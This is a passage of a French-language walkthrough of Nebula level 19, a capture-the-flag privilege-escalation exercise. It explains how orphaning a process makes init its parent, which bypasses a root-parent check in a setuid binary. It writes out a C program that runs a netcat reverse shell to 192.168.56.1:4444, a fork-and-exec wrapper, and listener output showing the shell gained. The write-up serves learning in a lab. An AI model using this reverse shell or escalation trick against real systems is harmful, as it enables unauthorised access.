  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

On voit qu'un path est formé qui correspond à l'entrée du processus parent sous `/proc`.

Ensuite la fonction `stat` est appelée sur le path pour déterminer qui est l'owner du processus. Si le processus parent appartient à root alors `/bin/sh` est exécuté en repassant les arguments que le processus courant (`flag19`) a reçu.

La technique c'est que quand on processus perd son parent mais continue d'exister il est automatiquement rattaché au processus init (de PID 1) du coup ça suffit ici à passer la vérification.

Je pensais d'abord pouvoir utiliser la commande `setsid` qui se présente de cette façon :

>       setsid lance un programme dans une nouvelle session. La commande appelle fork(2) s'il y a déjà un meneur de groupe de processus. Sinon, il exécute un programme dans le processus actuel. Ce  
>       comportement par défaut peut être outrepassé avec l'option --fork.

En effet si je lance la commande `setsid top` je peux voir `top` se lancer dans le terminal et si je lance `pstree` depuis un autre terminal je vois ceci :

```
init─┬─atd
     ├─cron
     ├─dbus-daemon
     ├─dhclient3
     ├─6*[getty]
     ├─lua
     ├─python
     ├─rsyslogd───3*[{rsyslogd}]
     ├─sshd─┬─3*[sshd───sshd───sh]
     │      └─sshd───sshd───sh───pstree
     ├─2*[thttpd]
     ├─top
     ├─udevd───2*[udevd]
     ├─upstart-socket-
     └─upstart-udev-br
```

Sur ce level  `setsid` lance bien le binaire mais les droits ne sont pas suffisants :

```shellsession
level19@nebula:/home/flag19$ setsid ./flag19 -c /bin/getflag
level19@nebula:/home/flag19$ getflag is executing on a non-flag account, this doesn't count
```

J'ai écrit le code C suivant qui fixe l'UID réel et effectif puis exécute un reverse-shell :

```c
#include <unistd.h>

int main(void) {
        setreuid(980, 980);
        system("nc.traditional -e /bin/bash 192.168.56.1 4444");
        return 0;
}
```

mais ça ne marchait pas mieux. J'ai donc du écrire mon propre code C qui fork et lance l'exécutable `flag19` :

```c
#include <unistd.h>

int main(void) {
        if (!fork()) {
                // child process
                execl("/home/flag19/flag19",  "/bin/sh",  "-c",  "/tmp/fixuid");
        }
        return 0;
}
```

Celui ci fonctionne :

```shellsession
$ ncat -l -p 4444 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.97.
Ncat: Connection from 192.168.56.97:60869.
id
uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
getflag
You have successfully executed getflag on a target account
```

J'ai particulièrement aimé les astuces sur le level 16 qui pourraient s'appliquer dans la réalité. Les autres sont instructifs mais pas forcément aussi réalistes.
